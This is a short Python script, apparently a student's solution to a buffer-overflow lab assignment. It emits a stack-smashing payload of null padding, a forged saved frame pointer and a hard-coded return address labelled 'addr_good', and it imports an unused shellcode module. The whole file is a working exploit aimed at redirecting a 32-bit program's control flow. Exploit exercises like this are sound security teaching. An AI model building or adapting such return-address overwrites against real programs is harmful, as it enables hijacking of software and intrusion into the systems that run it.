#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
addr_good = 0x080488c5

pad = 4*3

old_ebp = 0xfffed728

sys.stdout.buffer.write(b'\0' * pad + pack('<I', old_ebp) + pack('<I', addr_good))
